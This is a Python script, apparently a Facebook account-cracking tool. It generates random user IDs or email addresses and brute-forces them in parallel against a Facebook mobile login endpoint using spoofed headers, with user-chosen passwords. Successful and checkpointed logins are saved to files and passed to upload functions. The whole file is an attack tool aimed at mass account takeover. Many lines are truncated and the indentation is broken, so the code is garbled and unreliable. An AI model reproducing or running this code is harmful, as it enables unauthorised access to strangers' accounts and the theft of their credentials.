                x = 11111111
                xx = 99999999
                idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(Y,G))
                #idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
                limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(100000 MAX):>
                if (limit)>100000:
                        exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
                try:
                        for n in range(limit):
                                _ = random.randint(x,xx)
                                __ = idx
                                self.id.append(__+str(_))
                        print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(le>
                        with ThreadPoolExecutor(max_workers=30) as coeg:
                                print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(>
                                print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
                                                                                     listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
                                if len(listpass)<=5:
                                        exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS">
                                print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\03>
                                print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
                                print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(R))
                                print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SE>
                                for user in self.id:
                                        coeg.submit(self.api, user, listpass.split(",>
                        exit("\n\n%s [#] CRACK COMPLETE..."%(G))
                except Exception as e:exit(str(e))


                def old4_6(self):
                x = 1111111
                xx = 9999999
                idx = input("%s [+] ENTER A DIGIT (10): %s"%(Y,G))
                #idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
                limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(10000 MAX): >
                if (limit)>10000:
                        exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
                try:
                        for n in range(limit):
                                _ = random.randint(x,xx)
                                __ = idx
                                self.id.append(__+str(_))
                                print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(le>
                        with ThreadPoolExecutor(max_workers=30) as coeg:
                                print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(>
                                print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G)>
                                listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
                                if len(listpass)<=5:
                                        exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS">
                                print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\03>
                                print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
                                print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))
                                print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SE>
                                for user in self.id:
                                        coeg.submit(self.api, user, listpass.split(",>
                                                                                   exit("\n\n%s [#] CRACK COMPLETE..."%(G))
                except Exception as e:exit(str(e))


        def old4_5(self):
                x = 111111
                xx = 999999
                #idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(Y,G))
                idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
                limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(10000 MAX): >
                if (limit)>10000:
                        exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
                try:
                        for n in range(limit):
                                _ = random.randint(x,xx)
                                __ = idx
                                self.id.append(__+str(_))
                        print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(le>
                        with ThreadPoolExecutor(max_workers=30) as coeg:
                                print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(>
                                print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G)>
                                listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
                                if len(listpass)<=5:
                                        exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS">
                                print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\03>
                                print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
                                      print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))
                                print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SE>
                                for user in self.id:
                                        coeg.submit(self.api, user, listpass.split(",>
                        exit("\n\n%s [#] CRACK COMPLETE..."%(G))
                except Exception as e:exit(str(e))


        def old_11(self):
                x = 1111111111111
                xx = 9999999999999
                idx = "50000"
                idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
                limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): >
                if (limit)>10000:
                        exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
                try:
                        for n in range(limit):
                                _ = random.randint(x,xx)
                                __ = idx
                                self.id.append(__+str(_))
                        print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(le>
                        with ThreadPoolExecutor(max_workers=30) as coeg:
                                print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(>
                                print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G)>
                                listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
                                      if len(listpass)<=5:
                                        exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS">
                                print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\03>
                                print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
                                print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))
                                print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SE>
                                for user in self.id:
                                        coeg.submit(self.api, user, listpass.split(",>
                        exit("\n\n%s [#] CRACK COMPLETE..."%(G))
                except Exception as e:exit(str(e))


        def old_13(self):
                x = 1111111111111
                xx = 9999999999999
                idx = "1000"
                idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
                limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): >
                if (limit)>50000:
                        exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
                try:
                        for n in range(limit):
                                _ = random.randint(x,xx)
                                __ = idx
                                self.id.append(__+str(_))
                        print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(le>
                                                                                   with ThreadPoolExecutor(max_workers=30) as coeg:
                                print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(>
                                print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G)>
                                listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
                                if len(listpass)<=5:
                                        exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS">
                                print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\03>
                                print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
                                print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))
                                print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SE>
                                for user in self.id:
                                        coeg.submit(self.api, user, listpass.split(",>
                        exit("\n\n%s [#] CRACK COMPLETE..."%(G))
                                                                                   except Exception as e:exit(str(e))


        def email(self):
                x = 111
                xx = 999
                nam = input("%s [?] TYPE A NAME %s(EX: Abir): "%(Y,G))
                nam = nam.replace(" ", "")
                print("%s EXAMPLE  : %s@gmail.com, @yahoo.com, @hotmail.com ETC"%(Y,G>
                idx = input("%s DOMAIN  : "%(B))
                limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): >
                if (limit)>50000:
                        exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
                                  try:
                        for n in range(limit):
                                _ = random.randint(x,xx)
                                __ = idx
                                ___ = nam
                                self.id.append(___+str(_)+__)
                        print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(le>
                        with ThreadPoolExecutor(max_workers=30) as coeg:
                                print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(>
                                print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G)>
                                listpass = input(" [?] ENTER PASSWORD : ")
                                if len(listpass)<=5:
                                        exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS">
                                             print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\03>
                                print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
                                print("%s [+] CP RESULT SAVED IN -> cp.txt"%(Y))
                                print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SE>
                                for user in self.id:
                                        coeg.submit(self.api, user, listpass.split(",>
                        exit("\n\n%s [#] CRACK COMPLETE..."%(G))
                except Exception as e:exit(str(e))

        def oldcrack(self):
                x = 11111111
                xx = 99999999
                idx = " 13"
                #idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
                limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(500000 MAX):>
                if (limit)>500000:
                        exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
                try:
                        for n in range(limit):
                                _ = random.randint(x,xx)
                                __ = idx
                                self.id.append(__+str(_))
                        print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(le>
                        with ThreadPoolExecutor(max_workers=30) as coeg:
                                print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(>
                                print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
                                                                                     listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
                                if len(listpass)<=5:
                                        exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS">
                                print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\03>
                                print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
                                print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))
                                print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SE>
                                for user in self.id:
                                        coeg.submit(self.api, user, listpass.split(",>
                        exit("\n\n%s [#] CRACK COMPLETE..."%(G))
                except Exception as e:exit(str(e))

                
                def api(self, uid, pwx):
                ua = random.choice(["Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac>
                                                        "Mozilla/5.0 (Linux; Android >
                                     "Mozilla/5.0 (Linux; Android 10; SM-A750G Build/>
                sys.stdout.write(
                        "\r\r %s\033[0;92m[BR3K] : %s/%s - s/%s -> \033[0;92m [OK:%s]>
                ); sys.stdout.flush()
                for pw in pwx:
                        pw = pw.lower()
                        ses = requests.Session()
                        headers = {
                                "x-fb-connection-bandwidth": str(random.randint(20000>
                                "x-fb-sim-hni": str(random.randint(20000, 40000)),
                                "x-fb-net-hni": str(random.randint(20000, 40000)),
                                "x-fb-connection-quality": "EXCELLENT",
                                "x-fb-connection-type": "cell.CTRadioAccessTechnology>
                                "user-agent": ua,
                                "content-type": "application/x-www-form-urlencoded",
                                "x-fb-http-engine": "Liger"
                        }
                        response = ses.get("https://b-api.facebook.com/method/auth.lo>
                        if "session_key" in response.text and "EAAA" in response.text:
                                print("\r \033[0;92m[Alamgir-OK] %s|%s\033[0;97m     >
                                self.ok.append("%s|%s"%(uid, pw))
                                      open("ok.txt","a").write(" [Alamgir-OK] %s|%s\n"%(uid>
                                uploadoks()
                                break
                        elif "www.facebook.com" in response.json()["error_msg"]:
                                print("\r \033[0;91m[Alamgir-CP] %s|%s\033[0;97m     >
                                self.cp.append("%s|%s"%(uid, pw))
                                open("cp.txt","a").write(" [Alamgir-CP] %s|%s\n"%(uid>
                                uploadcps()
                                break
                        else:
                                continue

                self.loop +=1

                if len(sys.argv) == 2:
        if sys.argv[1] == "--help" or sys.argv[1] == "-h":
                helpnote()
        else:
                Main()

try:Main()
except Exception as e:exit(str(e))
